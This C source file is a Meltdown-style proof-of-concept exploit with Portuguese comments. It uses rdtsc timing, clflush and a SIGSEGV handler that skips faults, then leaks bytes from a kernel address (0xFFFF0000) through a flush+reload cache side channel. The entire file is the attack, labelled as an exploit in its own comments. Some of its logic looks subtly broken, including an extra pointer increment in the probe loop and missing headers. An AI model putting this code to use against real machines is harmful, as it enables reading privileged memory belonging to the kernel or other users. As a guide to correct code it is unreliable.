#include <stdio.h>
#include <stdlib.h>

#include <string.h>
#include <signal.h>



#define NUM_ITERACOES 100
#define CACHE_LINE_LEN	128
#define LEN_MEM_ARRAY	1000
#define TRIAL_TIMES	 1000

static inline void Flush(void *);


void PrintLista(int lista[])
{
	printf("Possiveis valores: ");
	for (int i=0; lista[i]!=-1;i++)
	{
		printf(" %i = %c",lista[i],lista[i]);
	}
	printf("\n");
}


static inline long ProbeFlush(void *addr) {
	/*ignora as otimizacoes*/
	volatile unsigned long tempo;
	/*exploit quase original*/
	asm __volatile__ (
				"  mfence             ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  lfence             ;"
				"  mov %%eax, %%esi  ;"	
				"  mov (%1), %%al   ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  sub %%esi, %%eax   ;"
				: "=a" (tempo)
				: "c" (addr)
   			);
	Flush(addr);
  return tempo;
}


static inline long Probe(void *addr) {
	/*ignora as otimizacoes*/
	volatile unsigned long tempo;
	/*exploit quase original*/
	asm __volatile__ (
				"  mfence             ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  lfence             ;"
				"  mov %%eax, %%esi  ;"	
				"  mov (%1), %%al   ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  sub %%esi, %%eax   ;"
				: "=a" (tempo)
				: "c" (addr)
   			);
  return tempo;
}

static inline void Flush(void *addr)
{
	asm __volatile__(
			"mfence		;"
			"clflush 0(%0)	;"
			"mfence		;"
			"lfence		;"
			: : "r" (addr)
			);
}





unsigned Treshold(void *baseSrc)
{

	void* base=baseSrc;
	unsigned i=0;
	unsigned j=0;
	unsigned probe;
	unsigned long long totalComFlush=0;
	unsigned long long totalSemFlush=0;
	while (i<NUM_ITERACOES){
		for (j=0;j<255;j++){
			probe=Probe(base+j*4096);
			totalComFlush+=probe;
		
			probe=ProbeFlush(base+j*4096);
			totalSemFlush+=probe;
			i++;
		
	
		}
	}
	totalComFlush=totalComFlush/(i);
	totalSemFlush=totalSemFlush/(i);
	printf("media com flush = %08X\n",(unsigned)totalComFlush);
	printf("media sem flush = %08X\n",(unsigned )totalSemFlush);
		

	return (totalComFlush+totalSemFlush)/2;

}

void fillArray(unsigned long array[],unsigned long addr)
{
	for(int i=0;i<200;i++){
		array[i]=0;
	}
	array[101]=addr;
}


static inline void FlushAll(void *base)
{
	register char *inicio=(char *)base;
	for (register int i=0; i <= 255 ; i++){
		Flush(inicio+i*4096);
	}
}

static inline int FindSecretLineCache(void *baseSrc,unsigned treshold,int lista[])
{
	void *base=baseSrc;
	unsigned tempo;
	int i=0;
	int c=0;
	while (i<255){
		
		
		tempo=Probe(base+i*4096);
		//printf("i=%u,tempo=%8x\n",i,tempo);
		if (tempo<treshold)
		{
			lista[c]=i;
			c++;
		}	
		base++;
		i++;
	}
	lista[c]=-1;
	return 0;


}

void fillArrayMemSpace(void *memspace[],void *original[])
{
	//avoid calling clflush all the time.
	void *bufferFill;
	for(int i=0;i<LEN_MEM_ARRAY;i++)
	{
		
		bufferFill=malloc(4096*256+0xFFFFFF);
		original[i]=bufferFill;
		bufferFill+=0xFFFFFF;
		bufferFill=(void *)((unsigned long)bufferFill & 0xFFFFFFFFF000000);
		memspace[i]=bufferFill;
	}
}

void handler(int nSignum, siginfo_t* si, void* vcontext) {
  
  ucontext_t* context = (ucontext_t*)vcontext;
  context->uc_mcontext.gregs[REG_RIP]++;
}


int installHandler() {


/*credits to https://gist.github.com/fairlight1337/55978671ace2c75020eddbfbdd670221 */	
  printf("segfault achievd\n");	
  struct sigaction action;
  memset(&action, 0, sizeof(struct sigaction));
  action.sa_flags = SA_SIGINFO;
  action.sa_sigaction = handler;
  sigaction(SIGSEGV, &action, NULL);
  
  int* x = 0;
  int y = *x;
  
  printf("igonring\n");	
  
  return 0;
}


int main(void)
{
	int ret,i;
	int lista[256];
	unsigned treshold;
	void *ptrArray;
	char *addr;
	char *segredo="isso eh secreto, esse texto eh realmente muito longo. Cuidado com instrucoes especuladas";

	void *kernelAddr;

	void *memspace[LEN_MEM_ARRAY];
	void *original[LEN_MEM_ARRAY];
	installHandler();


	fillArrayMemSpace(memspace,original);
	treshold=Treshold(memspace[0]);
	//treshold=0x300;

	kernelAddr=(void *)(NULL +0xFFFF0000);	
	
	segredo=(char *)kernelAddr;

	
	addr=segredo;

	for (i=1;i<LEN_MEM_ARRAY;i++ )
	{
	
		ptrArray=memspace[i];
		
		
		ret=*((int *)(ptrArray+(unsigned)addr[0]*4096));
		asm __volatile__(
				"mfence\n"
				"lfence\n"
				);
		printf("addr: %p: ",addr);
	
		FindSecretLineCache(ptrArray,treshold,lista);
		
		PrintLista(lista);
		FlushAll(ptrArray);
		//if (i>100)
		//{
		//	free(original[(i%100)-100]);	
		//}

		addr++;
		
	
	}

	//exit friendly
	for (i=0;i< LEN_MEM_ARRAY;i++)
	{
		//free(original[i]);
	}
	return 0;

}
















